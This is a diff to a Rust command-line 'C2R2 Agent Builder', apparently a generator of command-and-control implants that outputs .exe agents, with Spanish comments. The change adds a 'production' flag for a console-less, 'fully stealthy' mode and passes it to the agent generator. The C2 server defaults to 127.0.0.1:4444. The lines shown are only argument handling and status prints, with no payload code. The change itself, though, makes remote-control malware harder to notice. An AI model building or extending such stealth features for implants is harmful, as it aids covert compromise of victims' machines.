@@ -28,6 +28,10 @@ enum Commands {
         /// Servidor C2 (IP:Puerto)
         #[arg(short, long, default_value = "127.0.0.1:4444")]
         server: String,
+        
+        /// Modo producción (sin consola, sin debug prints, totalmente stealthy)
+        #[arg(short, long)]
+        production: bool,
     },
     
     /// Encripta un módulo DLL para ser usado por el agente
@@ -42,13 +46,14 @@ fn main() {
     let args = Args::parse();
 
     match args.command {
-        Commands::BuildAgent { name, server } => {
+        Commands::BuildAgent { name, server, production } => {
             println!("🔧 C2R2 Agent Builder v2.0");
             println!("🏷️  Agente: {}", name);
             println!("🌐 Servidor C2: {}", server);
+            println!("🔒 Modo: {}", if production { "PRODUCCIÓN (stealthy)" } else { "DESARROLLO (debug)" });
             println!("{}", "-".repeat(50));
             
-            match generate_agent(&name, &server) {
+            match generate_agent(&name, &server, production) {
                 Ok(_) => {
                     println!("✅ Agente generado exitosamente: {}.exe", name);
                 }
